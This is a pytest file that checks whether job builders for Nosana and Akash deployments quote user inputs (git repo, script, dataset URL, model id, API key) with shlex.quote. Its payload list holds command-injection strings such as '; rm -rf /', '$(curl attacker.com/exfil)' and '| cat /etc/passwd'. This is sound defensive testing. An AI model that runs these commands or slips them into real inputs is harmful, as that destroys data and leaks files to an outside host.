"""
Tests for command injection prevention in job builders.

Verifies that user-supplied inputs (git_repo, training_script, dataset_url,
model_id, api_key) are properly sanitized with shlex.quote() before
interpolation into shell command strings.
"""

import shlex
from unittest.mock import patch

import pytest

# Patch settings before importing job_builder so it doesn't fail on missing config
_mock_settings = type("Settings", (), {"internal_api_key": "test-key"})()

with patch(
    "inferia.services.orchestration.config.settings", _mock_settings
):
    from inferia.services.orchestration.services.adapter_engine.adapters.nosana.job_builder import (
        create_training_job,
        create_triton_job,
        create_infinity_job,
    )

from inferia.services.orchestration.services.adapter_engine.adapters.akash.sdl_builder import (
    build_training_sdl,
)


# -- Injection payloads to test against --

INJECTION_PAYLOADS = [
    # Shell command chaining
    "https://example.com/repo; rm -rf /",
    # Subshell execution
    "$(curl attacker.com/exfil)",
    # Backtick execution
    "`curl attacker.com/exfil`",
    # Pipe injection
    "value | cat /etc/passwd",
    # Ampersand chaining
    "value && curl attacker.com",
    # Newline injection
    "value\ncurl attacker.com",
    # Quote escaping
    "value'; curl attacker.com; echo '",
    # Double quote escaping
    'value"; curl attacker.com; echo "',
]


def _extract_cmd_string(job_result: dict) -> str:
    """Extract the shell command string from a Nosana job definition.

    Handles both formats:
    - Training jobs: {"ops": [{"args": {"cmd": ["/bin/bash", "-c", "..."]}}]}
    - Other jobs: {"op": {"args": {"cmd": ["-c", "..."]}}}
    """
    if "ops" in job_result:
        cmd = job_result["ops"][0]["args"]["cmd"]
    else:
        cmd = job_result["op"]["args"]["cmd"]
    # cmd is a list like ["/bin/bash", "-c", "..."] or ["-c", "..."]
    if isinstance(cmd, list) and "-c" in cmd:
        idx = cmd.index("-c")
        return cmd[idx + 1]
    return " ".join(cmd) if isinstance(cmd, list) else cmd


def _assert_no_unquoted_injection(cmd_string: str, payload: str):
    """Assert that the raw payload does not appear unquoted in the command."""
    # The raw payload should NOT appear in the command string.
    # shlex.quote wraps it in single quotes, so the quoted version should appear.
    quoted = shlex.quote(payload)
    assert payload not in cmd_string or quoted in cmd_string, (
        f"Raw payload found unquoted in command.\n"
        f"Payload: {payload!r}\n"
        f"Command: {cmd_string!r}"
    )


# ============================================================
# Nosana create_training_job
# ============================================================


class TestCreateTrainingJobInjection:
    """Test that create_training_job sanitizes all user inputs."""

    def test_git_repo_injection(self):
        for payload in INJECTION_PAYLOADS:
            result = create_training_job(
                image="pytorch/pytorch:latest",
                training_script="train.py",
                git_repo=payload,
            )
            cmd = _extract_cmd_string(result)
            _assert_no_unquoted_injection(cmd, payload)

    def test_training_script_py_injection(self):
        for payload in INJECTION_PAYLOADS:
            script = payload + ".py"
            result = create_training_job(
                image="pytorch/pytorch:latest",
                training_script=script,
            )
            cmd = _extract_cmd_string(result)
            _assert_no_unquoted_injection(cmd, script)

    def test_training_script_sh_injection(self):
        for payload in INJECTION_PAYLOADS:
            script = payload + ".sh"
            result = create_training_job(
                image="pytorch/pytorch:latest",
                training_script=script,
            )
            cmd = _extract_cmd_string(result)
            _assert_no_unquoted_injection(cmd, script)

    def test_training_script_raw_injection(self):
        for payload in INJECTION_PAYLOADS:
            result = create_training_job(
                image="pytorch/pytorch:latest",
                training_script=payload,
            )
            cmd = _extract_cmd_string(result)
            _assert_no_unquoted_injection(cmd, payload)

    def test_dataset_url_injection(self):
        for payload in INJECTION_PAYLOADS:
            result = create_training_job(
                image="pytorch/pytorch:latest",
                training_script="train.py",
                dataset_url=payload,
            )
            cmd = _extract_cmd_string(result)
            _assert_no_unquoted_injection(cmd, payload)

    def test_combined_injection_all_fields(self):
        """All injectable fields contain payloads simultaneously."""
        payload = "; rm -rf / #"
        result = create_training_job(
            image="pytorch/pytorch:latest",
            training_script=payload,
            git_repo=payload,
            dataset_url=payload,
        )
        cmd = _extract_cmd_string(result)
        # The raw payload should never appear unquoted
        quoted = shlex.quote(payload)
        # Count occurrences: every occurrence of the payload in the cmd
        # must be the quoted version
        raw_count = cmd.count(payload)
        quoted_count = cmd.count(quoted)
        assert raw_count == quoted_count, (
            f"Found {raw_count} raw vs {quoted_count} quoted occurrences"
        )

    def test_normal_inputs_still_work(self):
        """Verify normal (safe) inputs produce a valid job definition."""
        result = create_training_job(
            image="pytorch/pytorch:2.1.2-cuda12.1-cudnn8-runtime",
            training_script="train.py",
            git_repo="https://github.com/user/repo.git",
            dataset_url="https://data.example.com/dataset.tar.gz",
            base_model="meta-llama/Llama-2-7b",
        )
        assert result["version"] == "0.1"
        assert result["type"] == "container"
        assert len(result["ops"]) == 1
        cmd = _extract_cmd_string(result)
        assert "git clone" in cmd
        assert "train.py" in cmd
        assert "wget" in cmd


# ============================================================
# Nosana create_triton_job
# ============================================================


class TestCreateTritonJobInjection:
    """Test that create_triton_job sanitizes model_id."""

    def test_model_id_injection(self):
        for payload in INJECTION_PAYLOADS:
            result = create_triton_job(model_id=payload)
            cmd_str = _extract_cmd_string(result)
            _assert_no_unquoted_injection(cmd_str, payload)

    def test_normal_model_id(self):
        result = create_triton_job(model_id="/mnt/models/bert-base")
        assert "op" in result
        assert "meta" in result


# ============================================================
# Nosana create_infinity_job
# ============================================================


class TestCreateInfinityJobInjection:
    """Test that create_infinity_job sanitizes model_id and api_key."""

    def test_model_id_injection(self):
        for payload in INJECTION_PAYLOADS:
            result = create_infinity_job(model_id=payload, gpu=False)
            cmd_str = _extract_cmd_string(result)
            _assert_no_unquoted_injection(cmd_str, payload)

    def test_api_key_injection(self):
        for payload in INJECTION_PAYLOADS:
            result = create_infinity_job(
                model_id="sentence-transformers/all-MiniLM-L6-v2",
                api_key=payload,
                gpu=False,
            )
            cmd_str = _extract_cmd_string(result)
            _assert_no_unquoted_injection(cmd_str, payload)

    def test_normal_inputs(self):
        result = create_infinity_job(
            model_id="sentence-transformers/all-MiniLM-L6-v2",
            gpu=False,
        )
        assert "op" in result
        assert "meta" in result


# ============================================================
# Akash build_training_sdl
# ============================================================


class TestBuildTrainingSdlInjection:
    """Test that build_training_sdl sanitizes env vars and shell commands."""

    def _parse_sdl_env(self, sdl_yaml: str, var_name: str) -> str:
        """Extract an env var value from the SDL YAML string."""
        import yaml
        sdl = yaml.safe_load(sdl_yaml)
        envs = sdl["services"]["training-node"]["env"]
        for entry in envs:
            if entry.startswith(f"{var_name}="):
                return entry[len(f"{var_name}="):]
        return ""

    def _parse_sdl_command(self, sdl_yaml: str) -> str:
        """Extract the shell command from the SDL YAML string."""
        import yaml
        sdl = yaml.safe_load(sdl_yaml)
        cmd = sdl["services"]["training-node"]["command"]
        # cmd is ["bash", "-c", "<script>"]
        return cmd[2] if len(cmd) > 2 else ""

    def test_git_repo_env_sanitized(self):
        for payload in INJECTION_PAYLOADS:
            sdl = build_training_sdl(
                image="pytorch/pytorch:latest",
                training_script="train.py",
                git_repo=payload,
            )
            env_val = self._parse_sdl_env(sdl, "GIT_REPO")
            # The env value should be shlex.quoted
            assert env_val == shlex.quote(payload), (
                f"GIT_REPO env not sanitized for payload: {payload!r}"
            )

    def test_dataset_url_env_sanitized(self):
        for payload in INJECTION_PAYLOADS:
            sdl = build_training_sdl(
                image="pytorch/pytorch:latest",
                training_script="train.py",
                dataset_url=payload,
            )
            env_val = self._parse_sdl_env(sdl, "DATASET_URL")
            assert env_val == shlex.quote(payload)

    def test_training_script_env_sanitized(self):
        for payload in INJECTION_PAYLOADS:
            sdl = build_training_sdl(
                image="pytorch/pytorch:latest",
                training_script=payload,
            )
            env_val = self._parse_sdl_env(sdl, "TRAINING_SCRIPT")
            assert env_val == shlex.quote(payload)

    def test_shell_command_uses_double_quotes(self):
        """Verify the shell command double-quotes variable expansions."""
        sdl = build_training_sdl(
            image="pytorch/pytorch:latest",
            training_script="train.py",
            git_repo="https://github.com/user/repo.git",
            dataset_url="https://data.example.com/data.tar.gz",
        )
        cmd = self._parse_sdl_command(sdl)
        # Variables should be double-quoted in the shell script
        assert '"$GIT_REPO"' in cmd, "GIT_REPO expansion should be double-quoted"
        assert '"$DATASET_URL"' in cmd, "DATASET_URL expansion should be double-quoted"
        assert '"$TRAINING_SCRIPT"' in cmd, "TRAINING_SCRIPT expansion should be double-quoted"

    def test_normal_inputs_produce_valid_sdl(self):
        """Verify normal inputs produce parseable SDL YAML."""
        import yaml
        sdl_str = build_training_sdl(
            image="pytorch/pytorch:latest",
            training_script="train.py",
            git_repo="https://github.com/user/repo.git",
        )
        sdl = yaml.safe_load(sdl_str)
        assert sdl["version"] == "2.0"
        assert "training-node" in sdl["services"]
        assert sdl["services"]["training-node"]["image"] == "pytorch/pytorch:latest"
